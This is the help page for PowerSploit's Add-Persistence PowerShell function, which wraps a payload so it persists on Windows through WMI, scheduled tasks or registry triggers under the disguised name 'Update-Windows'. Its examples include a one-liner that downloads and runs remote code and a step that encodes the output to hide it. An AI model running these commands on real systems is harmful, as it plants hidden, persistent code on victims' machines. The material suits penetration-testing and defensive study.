# Add-Persistence

## SYNOPSIS
Add persistence capabilities to a script.

PowerSploit Function: Add-Persistence  
Author: Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: New-ElevatedPersistenceOption, New-UserPersistenceOption  
Optional Dependencies: None

## SYNTAX

### ScriptBlock
```
Add-Persistence -ScriptBlock <ScriptBlock> -ElevatedPersistenceOption <Object> -UserPersistenceOption <Object>
 [-PersistenceScriptName <String>] [-PersistentScriptFilePath <String>] [-RemovalScriptFilePath <String>]
 [-DoNotPersistImmediately] [-PassThru]
```

### FilePath
```
Add-Persistence -FilePath <String> -ElevatedPersistenceOption <Object> -UserPersistenceOption <Object>
 [-PersistenceScriptName <String>] [-PersistentScriptFilePath <String>] [-RemovalScriptFilePath <String>]
 [-DoNotPersistImmediately] [-PassThru]
```

## DESCRIPTION
Add-Persistence will add persistence capabilities to any script or scriptblock.
This function will output both the newly created script with persistence capabilities as well a script that will remove a script after it has been persisted.

## EXAMPLES

### -------------------------- EXAMPLE 1 --------------------------
```
$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
```

$UserOptions = New-UserPersistenceOption -Registry -AtLogon
Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose

Description
-----------
Creates a script containing the contents of EvilPayload.ps1 that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs.
elevated) determined at runtime.

### -------------------------- EXAMPLE 2 --------------------------
```
$Rickroll = { iex (iwr http://bit.ly/e0Mw9w ) }
```

$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1

Description
-----------
Creates a script containing the contents of the provided scriptblock that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs.
elevated) determined at runtime.
The output is then passed through to Out-EncodedCommand so that it can be executed in a single command line statement.
The final, encoded output is finally saved to .\EncodedPersistentScript.ps1

## PARAMETERS

### -ScriptBlock
Specifies a scriptblock containing your payload.

```yaml
Type: ScriptBlock
Parameter Sets: ScriptBlock
Aliases: 

Required: True
Position: Named
Default value: None
Accept pipeline input: True (ByValue)
Accept wildcard characters: False
```

### -FilePath
Specifies the path to your payload.

```yaml
Type: String
Parameter Sets: FilePath
Aliases: Path

Required: True
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -ElevatedPersistenceOption
Specifies the trigger for the persistent payload if the target is running elevated.
You must run New-ElevatedPersistenceOption to generate this argument.

```yaml
Type: Object
Parameter Sets: (All)
Aliases: 

Required: True
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -UserPersistenceOption
Specifies the trigger for the persistent payload if the target is not running elevated.
You must run New-UserPersistenceOption to generate this argument.

```yaml
Type: Object
Parameter Sets: (All)
Aliases: 

Required: True
Position: Named
Default value: None
Accept pipeline input: False
Accept wildcard characters: False
```

### -PersistenceScriptName
Specifies the name of the function that will wrap the original payload.
The default value is 'Update-Windows'.

```yaml
Type: String
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: Update-Windows
Accept pipeline input: False
Accept wildcard characters: False
```

### -PersistentScriptFilePath
Specifies the path where you would like to output the persistence script.
By default, Add-Persistence will write the removal script to 'Persistence.ps1' in the current directory.

```yaml
Type: String
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: "$PWD\Persistence.ps1"
Accept pipeline input: False
Accept wildcard characters: False
```

### -RemovalScriptFilePath
Specifies the path where you would like to output a script that will remove the persistent payload.
By default, Add-Persistence will write the removal script to 'RemovePersistence.ps1' in the current directory.

```yaml
Type: String
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: "$PWD\RemovePersistence.ps1"
Accept pipeline input: False
Accept wildcard characters: False
```

### -DoNotPersistImmediately
Output only the wrapper function for the original payload.
By default, Add-Persistence will output a script that will automatically attempt to persist (e.g.
it will end with 'Update-Windows -Persist').
If you are in a position where you are running in memory but want to persist at a later time, use this option.

```yaml
Type: SwitchParameter
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: False
Accept pipeline input: False
Accept wildcard characters: False
```

### -PassThru
Outputs the contents of the persistent script to the pipeline.
This option is useful when you want to write the original persistent script to disk and pass the script to Out-EncodedCommand via the pipeline.

```yaml
Type: SwitchParameter
Parameter Sets: (All)
Aliases: 

Required: False
Position: Named
Default value: False
Accept pipeline input: False
Accept wildcard characters: False
```

## INPUTS

### None

Add-Persistence cannot receive any input from the pipeline.

## OUTPUTS

### System.Management.Automation.ScriptBlock

If the '-PassThru' switch is provided, Add-Persistence will output a scriptblock containing the contents of the persistence script.

## NOTES
When the persistent script executes, it will not generate any meaningful output as it was designed to run as silently as possible on the victim's machine.

## RELATED LINKS

[http://www.exploit-monday.com](http://www.exploit-monday.com)

